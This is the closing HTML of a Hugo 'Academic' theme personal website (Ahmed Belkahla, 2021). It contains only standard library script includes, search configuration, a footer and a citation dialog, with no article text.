    </div>
  </div>












  
  



  </div>
</article>

      

    
    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.imagesloaded/4.1.4/imagesloaded.pkgd.min.js" integrity="sha256-lqvxZrPLtfffUl2G/e7szqSvPBILGbwmsGE1MKlOi0Q=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.isotope/3.0.6/isotope.pkgd.min.js" integrity="sha256-CBrpuqrMhXwcLLUd5tvQ4euBHCdh7wGlDfNz8vbu/iI=" crossorigin="anonymous"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>

      

      
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/highlight.min.js" integrity="sha256-eOgo0OtLL4cdq7RdwRUiGKLX9XsIJ7nGhWEKbohmVAQ=" crossorigin="anonymous"></script>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.18.1/languages/r.min.js"></script>
        
      

    

    
    
      <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.5.1/leaflet.js" integrity="sha256-EErZamuLefUnbMBQbsEqu1USa+btR2oIlCpBJbyD4/g=" crossorigin="anonymous"></script>
    

    
    
    <script>const code_highlighting = true;</script>
    

    
    
    <script>const isSiteThemeDark = true;</script>
    

    
    
    
    
    
    
    <script>
      const search_config = {"indexURI":"/index.json","minLength":1,"threshold":0.3};
      const i18n = {"no_results":"No results found","placeholder":"Search...","results":"results found"};
      const content_type = {
        'post': "Posts",
        'project': "Projects",
        'publication' : "Publications",
        'talk' : "Talks"
        };
    </script>
    

    
    

    
    
    <script id="search-hit-fuse-template" type="text/x-template">
      <div class="search-hit" id="summary-{{key}}">
      <div class="search-hit-content">
        <div class="search-hit-name">
          <a href="{{relpermalink}}">{{title}}</a>
          <div class="article-metadata search-hit-type">{{type}}</div>
          <p class="search-hit-description">{{snippet}}</p>
        </div>
      </div>
      </div>
    </script>
    

    
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/fuse.js/3.2.1/fuse.min.js" integrity="sha256-VzgmKYmhsGNNN4Ph1kMW+BjoYJM2jV5i4IlFoeZA9XI=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/mark.js/8.11.1/jquery.mark.min.js" integrity="sha256-4HLtjeVgH0eIB3aZ9mLYF6E8oU5chNdjU6p6rrXpl9U=" crossorigin="anonymous"></script>
    

    
    

    
    

    
    
    
    
    
    
    
    
    
      
    
    
    
    
    <script src="/js/academic.min.37431be2d92d7fb0160054761ab79602.js"></script>

    






  
  
  <div class="container">
    <footer class="site-footer">
  

  <p class="powered-by">
    © Ahmed Belkahla, 2021 &middot; 

    Powered by the
    <a href="https://sourcethemes.com/academic/" target="_blank" rel="noopener">Academic theme</a> for
    <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a>.

    
    <span class="float-right" aria-hidden="true">
      <a href="#" class="back-to-top">
        <span class="button_icon">
          <i class="fas fa-chevron-up fa-2x"></i>
        </span>
      </a>
    </span>
    
  </p>
</footer>

  </div>
  

  
<div id="modal" class="modal fade" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title">Cite</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <pre><code class="tex hljs"></code></pre>
      </div>
      <div class="modal-footer">
        <a class="btn btn-outline-primary my-1 js-copy-cite" href="#" target="_blank">
          <i class="fas fa-copy"></i> Copy
        </a>
        <a class="btn btn-outline-primary my-1 js-download-cite" href="#" target="_blank">
          <i class="fas fa-download"></i> Download
        </a>
        <div id="modal-error"></div>
      </div>
    </div>
  </div>
</div>

</body>
</html>
